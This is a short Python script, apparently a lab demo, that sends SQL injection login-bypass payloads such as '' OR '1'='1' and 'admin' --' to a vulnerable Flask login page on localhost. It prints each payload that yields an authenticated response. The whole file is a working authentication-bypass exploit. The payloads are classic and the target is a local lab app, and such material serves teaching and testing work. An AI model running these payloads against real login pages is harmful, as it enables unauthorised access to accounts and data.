import requests

# Target vulnerable Flask app
TARGET = "http://127.0.0.1:5000/login"

# Payloads to test (lab-only, safe)
payloads = [
    "admin' --",
    "' OR '1'='1",
    "alice' --"
]

print("[*] Running exploit demo...")

for payload in payloads:
    params = {"username": payload, "password": "irrelevant"}
    try:
        r = requests.get(TARGET, params=params, timeout=5)
        if "Authenticated as" in r.text:
            print(f"[+] SUCCESS: Payload '{payload}' worked!")
            print(f" Response: {r.text}\n")
    except requests.RequestException as e:
        print(f"[!] Error with payload '{payload}': {e}")

print("[*] Exploit demo complete.")